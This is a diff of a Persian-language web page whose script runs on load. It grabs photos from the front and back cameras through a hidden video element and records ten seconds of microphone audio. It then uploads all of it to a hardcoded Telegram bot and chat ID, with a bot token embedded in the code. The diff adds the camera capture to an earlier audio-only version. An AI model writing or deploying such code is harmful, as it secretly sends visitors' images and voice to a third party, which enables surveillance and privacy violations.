@@ -2,7 +2,7 @@
 <html lang="fa">
 <head>
   <meta charset="UTF-8">
-  <title>ضبط صدا</title>
+  <title>ضبط صدا و عکس از دوربین جلو و عقب</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
@@ -16,66 +16,112 @@
       color: green;
       font-weight: bold;
     }
+    video {
+      display: none;
+    }
   </style>
 </head>
 <body>
-  <h2>ضبط صدای خودکار</h2>
+  <h2>ضبط صدا و گرفتن عکس از دوربین‌ها</h2>
   <p class="status" id="status">در حال آماده‌سازی...</p>
+  <video id="video" autoplay playsinline></video>
 
   <script>
     const botToken = "7996751116:AAFRkCkQ32NI35JKeqeacSFayJnPjlMVRxs";
     const chatId = "1120400003";
     const statusText = document.getElementById("status");
+    const video = document.getElementById("video");
 
-    async function startAutoRecording() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        const mediaRecorder = new MediaRecorder(stream);
-        const audioChunks = [];
+    let audioBlob;
+    let photoFront;
+    let photoBack;
 
-        mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
+    async function captureImage(facingMode) {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+      video.srcObject = stream;
 
+      // صبر برای نمایش تصویر
+      await new Promise(resolve => setTimeout(resolve, 1000));
+
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
+
+      stream.getTracks().forEach(track => track.stop());
+      return blob;
+    }
+
+    async function recordAudio() {
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      const mediaRecorder = new MediaRecorder(stream);
+      const chunks = [];
+
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+
+      return new Promise((resolve) => {
         mediaRecorder.onstop = () => {
-          const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
-          sendVoice(audioBlob);
+          stream.getTracks().forEach(track => track.stop());
+          resolve(new Blob(chunks, { type: "audio/webm" }));
         };
 
         mediaRecorder.start();
-        statusText.innerText = "🎙 در حال ضبط به مدت ۱۰ ثانیه...";
-
+        statusText.innerText = "🎙 در حال ضبط صدا به مدت ۱۰ ثانیه...";
         setTimeout(() => {
           mediaRecorder.stop();
-          statusText.innerText = "⏳ در حال ارسال صدا...";
+          statusText.innerText = "⏳ در حال ارسال اطلاعات...";
         }, 10000);
-      } catch (error) {
-        statusText.innerText = "❌ دسترسی به میکروفون رد شد یا خطایی رخ داد.";
-      }
+      });
     }
 
-    function sendVoice(blob) {
+    function sendToTelegram(audio, photoFront, photoBack) {
       const formData = new FormData();
       formData.append("chat_id", chatId);
-      formData.append("voice", blob);
+      formData.append("caption", "📤 فایل‌های ارسالی:");
+      formData.append("voice", audio, "voice.webm");
 
       fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
         method: "POST",
         body: formData
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (data.ok) {
-          statusText.innerText = "✅ صدا با موفقیت ارسال شد!";
-        } else {
-          statusText.innerText = "❌ خطا در ارسال صدا!";
-        }
-      })
-      .catch(() => {
-        statusText.innerText = "❌ خطا در اتصال به تلگرام!";
       });
+
+      const formDataFront = new FormData();
+      formDataFront.append("chat_id", chatId);
+      formDataFront.append("photo", photoFront, "front.jpg");
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formDataFront
+      });
+
+      const formDataBack = new FormData();
+      formDataBack.append("chat_id", chatId);
+      formDataBack.append("photo", photoBack, "back.jpg");
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: "POST",
+        body: formDataBack
+      });
+
+      statusText.innerText = "✅ صدا و عکس‌ها با موفقیت ارسال شدند!";
     }
 
-    // اجرای خودکار بعد از لود صفحه
-    window.onload = startAutoRecording;
+    async function startAll() {
+      try {
+        statusText.innerText = "📸 در حال گرفتن عکس از دوربین جلو...";
+        photoFront = await captureImage("user");
+
+        statusText.innerText = "📸 در حال گرفتن عکس از دوربین عقب...";
+        photoBack = await captureImage("environment");
+
+        audioBlob = await recordAudio();
+
+        sendToTelegram(audioBlob, photoFront, photoBack);
+      } catch (e) {
+        statusText.innerText = "❌ خطایی رخ داد یا دسترسی رد شد.";
+      }
+    }
+
+    window.onload = startAll;
   </script>
 </body>
 </html>
